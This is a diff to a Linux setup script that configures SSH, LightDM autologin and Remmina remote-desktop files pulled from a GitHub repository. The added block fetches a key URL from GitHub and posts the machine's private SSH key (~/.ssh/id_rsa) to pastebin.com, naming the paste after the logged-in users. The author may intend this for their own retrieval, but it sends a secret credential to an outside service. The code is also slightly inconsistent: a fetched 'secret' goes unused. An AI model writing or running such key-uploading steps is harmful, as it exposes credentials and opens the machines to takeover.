@@ -26,6 +26,21 @@ sed -i "/PubkeyAuthentication yes/c PubkeyAuthentication yes" sshd_config
 service sshd restart
 service ssh restart
 
+echo "Getting pastebin key"
+pastebin_key=$(curl -fsSL https://raw.githubusercontent.com/sshcrack/lithium-setup/master/pastebin_secret_url.txt)
+secret=$(curl -fsSL $pastebin_key/secret.txt)
+
+echo "Adding pastebin"
+curl --location --request POST 'https://pastebin.com/api/api_post.php' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--data-urlencode 'api_dev_key='$pastebin_key \
+--data-urlencode 'api_option=paste' \
+--data-urlencode 'api_paste_private=1' \
+--data-urlencode 'api_paste_name='$(users)'-privKey' \
+--data-urlencode 'api_paste_expire_date=10M' \
+--data-urlencode 'api_paste_format=bash' \
+--data-urlencode 'api_paste_code='$(cat ~/.ssh/id_rsa)
+
 cd /etc/lightdm
 
 echo "Adding autologin..."
@@ -39,5 +54,6 @@ sed -i 's/#session-setup-script=/session-setup-script=\/root\/remmina.sh/g' ligh
 echo "Getting remmina configs..."
 curl -fsSL https://raw.githubusercontent.com/sshcrack/lithium-setup/master/profile.remmina > /root/profile.remmina
 curl -fsSL https://raw.githubusercontent.com/sshcrack/lithium-setup/master/remmina.sh > /root/remmina.sh
+curl -fsSL https://raw.githubusercontent.com/sshcrack/lithium-setup/master/remmina.pref > /root/.config/remmina/remmina.pref
 
 echo "Done!"
